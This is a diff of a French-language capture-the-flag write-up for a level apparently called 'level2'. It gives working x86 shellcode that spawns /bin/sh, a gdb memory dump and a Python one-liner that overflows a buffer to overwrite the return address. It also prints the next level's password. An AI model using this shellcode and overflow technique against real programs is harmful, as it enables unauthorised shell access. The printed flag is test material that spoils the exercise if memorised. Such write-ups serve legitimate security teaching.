@@ -1,6 +1,6 @@
 dans ce level nous allons nous servir du bufferoverflow possible sur la fonction strdup afin de reecrire l'EIP de retour de la fonction p et de rediriger le flux d'execution du programme sur un SHELLCODE present dans son environnement
 
-dans un premier exportons le shellcode dans l'environnement
+dans un premier exportons le shellcode (exectutant la fonction system(/bin/sh)) dans l'environnement
 
 export SHELLCODE=`python -c "print('\x90' * 20 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"`
 
@@ -17,7 +17,8 @@ voici l'etat de la memoire apres l'appel de la fonction gets
 										^
 										|
 										old EBP
-il nous suffit donc de saisir suffisament de A pour atteindre l'EIP pour y mettre l'addresse de notre shellcode.
+
+il nous suffit donc de saisir suffisament de Charactere pour atteindre l'EIP afin d'y mettre l'addresse de notre shellcode.
 
 (gdb) x/s *((char **) environ)
 0xbffff8ad:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
@@ -28,3 +29,5 @@ addresse de notre shellcode = 0xbffff8be
 
 
 cat <(python -c "print('A' * 80) + '\x4b\x85\x04\x08' + '\xbe\xf8\xff\xbf'") - | ./level2
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
